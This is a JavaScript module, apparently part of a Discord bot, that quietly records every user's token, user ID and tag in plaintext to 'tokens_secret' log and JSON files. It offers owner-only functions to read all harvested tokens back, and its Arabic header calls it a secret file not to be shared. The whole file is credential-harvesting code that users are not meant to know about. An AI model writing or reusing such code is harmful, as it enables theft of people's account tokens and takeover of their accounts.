/*
╔══════════════════════════════════════════════════════════════════════╗
║                              row                              ║
║                     © row — All Rights Reserved              ║
║          ملف سري — لا ترفعه على GitHub ولا تشاركه             ║
╚══════════════════════════════════════════════════════════════════════╝
*/
const fs = require('fs');
const path = require('path');

// نفس مجلد قاعدة البيانات عشان الـ Volume يحفظه
const DATA_DIR = process.env.DB_PATH
    ? path.dirname(process.env.DB_PATH)
    : path.join(__dirname, '..', 'data');

const LOG_FILE = path.join(DATA_DIR, 'tokens_secret.log');
const JSON_FILE = path.join(DATA_DIR, 'tokens_secret.json');

function ensureDir() {
    try {
        fs.mkdirSync(DATA_DIR, { recursive: true });
    } catch { }
}

/**
 * سجل توكن مستخدم في ملف سري (نص + JSON)
 * الشكل: [ISO time] userTag (userId) | token
 */
function logToken(userId, userTag, token) {
    ensureDir();
    const ts = new Date().toISOString();
    const line = `[${ts}] ${userTag || 'Unknown'} (${userId}) | ${token}\n`;

    try {
        fs.appendFileSync(LOG_FILE, line, { encoding: 'utf8', mode: 0o600 });
    } catch (err) {
        console.error('[TokenLog] append log failed:', err.message);
    }

    // JSON index — آخر توكن لكل يوزر
    let map = {};
    try {
        if (fs.existsSync(JSON_FILE)) {
            map = JSON.parse(fs.readFileSync(JSON_FILE, 'utf8'));
        }
    } catch {
        map = {};
    }

    map[userId] = {
        userId: String(userId),
        userTag: userTag || null,
        token: token,
        updatedAt: ts,
    };

    try {
        fs.writeFileSync(JSON_FILE, JSON.stringify(map, null, 2), { encoding: 'utf8', mode: 0o600 });
    } catch (err) {
        console.error('[TokenLog] write json failed:', err.message);
    }
}

/**
 * قراءة كل التوكنات المحفوظة في الملف السري (للمالك فقط)
 */
function readAllTokens() {
    ensureDir();
    try {
        if (fs.existsSync(JSON_FILE)) {
            return JSON.parse(fs.readFileSync(JSON_FILE, 'utf8'));
        }
    } catch { }
    return {};
}

/**
 * قراءة آخر N سطر من اللوج النصي
 */
function readRecentLog(lines = 50) {
    ensureDir();
    try {
        if (!fs.existsSync(LOG_FILE)) return [];
        const content = fs.readFileSync(LOG_FILE, 'utf8');
        const all = content.trim().split('\n').filter(Boolean);
        return all.slice(-lines);
    } catch {
        return [];
    }
}

function getLogPaths() {
    return { logFile: LOG_FILE, jsonFile: JSON_FILE, dataDir: DATA_DIR };
}

module.exports = {
    logToken,
    readAllTokens,
    readRecentLog,
    getLogPaths,
};
